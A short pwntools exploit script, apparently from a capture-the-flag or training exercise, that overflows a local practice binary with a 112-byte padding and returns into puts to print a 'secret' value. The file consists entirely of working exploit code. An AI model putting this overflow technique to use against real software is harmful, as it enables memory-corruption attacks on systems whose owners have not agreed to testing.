#!/usr/bin/python

from pwn import *

puts = 0x8048480
secret_addr = 0x8048940 # gdb p secret

def main():
    # Start the process
    p = process("services/event0/event0")

    # Print the pid
    # Craft the payload
    payload = "A"*112 
    payload += p32(puts)
    payload += p32(0xdeadc0de)
    payload += p32(secret_addr)
    payload = payload.ljust(200, "\x00")

    # Send the payload
    p.send(payload)

    # Pass interaction to the user
    p.interactive()

if __name__ == "__main__":
    main()
